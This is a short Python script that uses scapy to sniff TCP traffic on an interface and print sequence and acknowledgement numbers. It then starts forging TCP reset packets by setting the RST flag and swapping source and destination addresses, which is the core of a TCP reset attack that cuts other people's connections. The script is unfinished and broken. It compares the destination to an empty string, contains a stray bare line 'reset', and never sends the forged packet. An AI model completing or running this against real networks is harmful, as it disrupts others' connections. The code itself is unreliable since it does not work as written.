from scapy.all import *
import random

target_ip = "192.168.13.30"

def pkt_callback(packet):
    if (TCP in packet):
        print("%s -> %s" % (packet[IP].src, packet[IP].dst))
        print("len: %d" % packet[IP].len)
        print("seq: %d, ack: %d" % (packet[TCP].seq, packet[TCP].ack))
        print("next seq: %d, next ack: %d" % (packet[TCP].ack, packet[TCP].seq + len(packet[TCP])-32))
        if (packet[IP].dst == ""):
            resetPkt = packet
            #set reset packet
            resetPkt[TCP].flags = 'R'
            #set ack number
            #the seq number should be whatever was last acked
            #the ack number should be whatever the last seq was + len of data
            ack = resetPkt[TCP].ack
            dst = resetPkt[IP].dst
            src = resetPkt[IP].src
            resetPkt[TCP].seq = resetPkt[TCP].ack
            reset
            resetPkt[IP].src = dst
            resetPkt[IP].dst = src


random.seed()
interface = "ens10"
conf.verb = 0
sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
